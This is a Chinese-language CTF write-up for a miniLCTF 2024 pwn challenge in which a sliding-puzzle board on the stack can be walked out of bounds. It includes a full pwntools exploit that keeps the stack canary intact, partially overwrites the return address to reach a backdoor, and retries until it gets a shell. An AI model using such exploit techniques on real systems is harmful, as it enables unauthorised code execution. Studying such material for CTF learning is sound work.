# miniLCTF 2024 game Writeup

## 题目简述

程序实现 4×4 数字华容道，棋盘位于栈上并受移动次数限制。`shift_up` 与 `shift_down` 没有检查空格纵坐标是否越界，使空格位置能够走出棋盘，进而把相邻栈数据当作棋盘格交换。二进制有 Canary 和 PIE，目标是扩大移动次数、跨过 Canary 修改返回地址，再以低 2 字节覆盖跳入后门。

## 解题过程

### 先扩大移动次数

正常次数不足以走到保存返回地址。通过上下移动的边界缺失，先让 `zero_pos` 离开 4×4 范围，再配合左右移动，把栈上的 `maxTry` 改成较大值。官方利用所用的第一段移动为：

```python
io.send(b"aawwwwwasssss")
io.send(b"ssddd")
```

完成后空格位于逻辑坐标 `(5, 3)`，后续可把栈槽逐个交换。

### 保持 Canary 并覆盖返回地址

栈上棋盘之后依次邻接 Canary、保存的 RBP 和返回地址。不能简单一路覆盖，因为函数返回时仍会校验 Canary。做法是：

1. 在玩家名中预先重复放入后门地址的低 2 字节；
2. 让空格向下移动到返回地址区域；
3. 用交换操作把预置字节送到保存返回地址的低位；
4. 按相反路径恢复经过的 Canary 栈槽；
5. 消耗剩余步数，使函数正常返回。

核心利用脚本如下：

```python
from pwn import *

def attempt():
    io = process("./game")

    # 当前附件后门低 16 位；重编译后必须重新确认。
    io.sendline(p16(0x9cd8) * 10)
    io.sendline()
    io.sendline()

    io.send(b"aawwwwwasssss")
    io.send(b"ssddd")

    io.send(b"sssssssa")
    io.send(b"wawasdsawdwasdsawdwasdds")
    io.send(b"dwwwwwww")

    io.send(b"ad" * (577 // 2) + b"a")
    io.recvuntil(b"Move remaining : 0")
    return io

while True:
    try:
        io = attempt()
        io.sendline(b"cat flag")
        io.interactive()
        break
    except EOFError:
        io.close()
```

只改返回地址低 2 字节时，其余高位沿用原返回地址所在的 PIE 映射。目标页内偏移固定，但 ASLR 页偏移存在 4 位不确定量，因此平均需要若干次、最坏约 16 次尝试。

## 方法总结

二维棋盘的边界错误本质上是受限的栈任意交换。利用时先修改控制变量解除步数限制，再规划一条既能覆盖返回地址、又能恢复 Canary 的移动路径。部分返回地址覆盖可以降低泄露需求，但必须明确其成功概率和二进制版本依赖。
